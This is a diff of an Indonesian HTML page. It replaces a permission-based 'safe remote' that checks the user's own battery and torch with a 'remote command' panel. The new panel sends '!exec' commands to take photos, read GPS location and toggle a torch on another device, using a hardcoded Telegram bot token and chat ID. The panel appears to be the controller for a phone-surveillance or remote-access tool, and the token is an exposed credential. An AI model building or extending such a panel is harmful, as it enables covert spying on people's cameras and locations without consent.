@@ -1,111 +1,48 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HAYABUSA SAFE REMOTE</title>
-
-<style>
-body {
-  background: #0d1117;
-  color: #58a6ff;
-  font-family: 'Segoe UI', sans-serif;
-  text-align: center;
-  padding: 20px;
-}
-.card {
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 14px;
-  padding: 20px;
-  margin-bottom: 20px;
-}
-button {
-  padding: 15px;
-  width: 100%;
-  margin-top: 12px;
-  font-size: 15px;
-  font-weight: bold;
-  border-radius: 10px;
-  border: 1px solid #30363d;
-  background: #21262d;
-  color: #c9d1d9;
-}
-button:active {
-  background: #238636;
-  color: white;
-}
-.status {
-  margin-top: 10px;
-  font-size: 14px;
-  color: #7ee787;
-}
-</style>
+    <title>HAYABUSA REMOTE CENTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0d1117; color: #58a6ff; text-align: center; font-family: sans-serif; padding: 20px; }
+        .card { border: 1px solid #30363d; border-radius: 12px; margin-bottom: 20px; padding: 15px; background: #161b22; }
+        button { padding: 15px; width: 100%; margin-top: 10px; border-radius: 8px; border: 1px solid #30363d; background: #21262d; color: #fff; font-weight: bold; }
+        .on { background: #238636; } .off { background: #da3633; }
+    </style>
 </head>
-
 <body>
+    <h2>🚀 REMOTE COMMAND</h2>
+    
+    <div class="card">
+        <h3>🔦 Kontrol Hardware</h3>
+        <button class="on" onclick="sendCmd('torch_on')">NYALAKAN SENTER</button>
+        <button class="off" onclick="sendCmd('torch_off')">MATIKAN SENTER</button>
+    </div>
 
-<h2>🛡️ HAYABUSA SAFE REMOTE</h2>
-<p>Fitur legal • Izin user • Tanpa hacking</p>
+    <div class="card">
+        <h3>📸 Monitoring</h3>
+        <button onclick="sendCmd('camera')">AMBIL FOTO SEKARANG</button>
+        <button onclick="sendCmd('location')">CEK LOKASI GPS</button>
+    </div>
 
-<div class="card">
-  <h3>🔋 Cek Baterai</h3>
-  <button onclick="cekBaterai()">CEK STATUS BATERAI</button>
-  <div id="battery" class="status">–</div>
-</div>
+    <div class="card" style="opacity: 0.5;">
+        <h3>💬 App Control (Butuh Termux)</h3>
+        <p style="font-size: 10px;">Fitur Buka WA/FB dilarang oleh Browser.</p>
+        <button disabled>BUKA WHATSAPP</button>
+    </div>
 
-<div class="card">
-  <h3>🔦 Senter (Torch)</h3>
-  <button onclick="toggleTorch()">NYALAKAN / MATIKAN SENTER</button>
-  <div class="status">Perlu izin kamera</div>
-</div>
+    <script>
+        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+        const ID = "7596509818";
 
-<script>
-/* ===== CEK BATERAI ===== */
-function cekBaterai() {
-  if (!navigator.getBattery) {
-    document.getElementById("battery").innerText = "Browser tidak support Battery API";
-    return;
-  }
-
-  navigator.getBattery().then(battery => {
-    const persen = Math.round(battery.level * 100);
-    const status = battery.charging ? "🔌 Sedang di-charge" : "🔋 Tidak di-charge";
-    document.getElementById("battery").innerText =
-      `Baterai: ${persen}% • ${status}`;
-  });
-}
-
-/* ===== SENTER ===== */
-let stream;
-let torchOn = false;
-
-async function toggleTorch() {
-  try {
-    if (!stream) {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "environment" }
-      });
-    }
-
-    const track = stream.getVideoTracks()[0];
-    const cap = track.getCapabilities();
-
-    if (!cap.torch) {
-      alert("HP tidak support senter via browser");
-      return;
-    }
-
-    torchOn = !torchOn;
-    await track.applyConstraints({
-      advanced: [{ torch: torchOn }]
-    });
-
-  } catch (e) {
-    alert("Izin kamera ditolak");
-  }
-}
-</script>
-
+        function sendCmd(cmd) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ID, text: `!exec ${cmd}` })
+            });
+            alert("Perintah dikirim: " + cmd);
+        }
+    </script>
 </body>
 </html>
